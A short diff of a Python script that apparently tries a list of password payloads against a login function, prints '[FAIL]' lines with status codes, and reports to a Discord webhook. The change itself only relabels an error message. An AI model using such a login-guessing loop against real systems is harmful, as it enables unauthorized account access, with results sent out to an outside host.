@@ -24,7 +24,7 @@ def notify_discord(message):
     try:
         requests.post(discord_webhook, json={"content": message})
     except Exception as e:
-        print(f"Chyba pri odosielani na Discord: {e}")
+        print(f"[-] Error: Chyba pri odosielani na Discord: {e}")
 
 def try_login(user, password):
     data = {
@@ -57,3 +57,4 @@ for pw in payloads:
         break
     else:
         print(f"[FAIL] {pw} | status: {resp.status_code}")
+
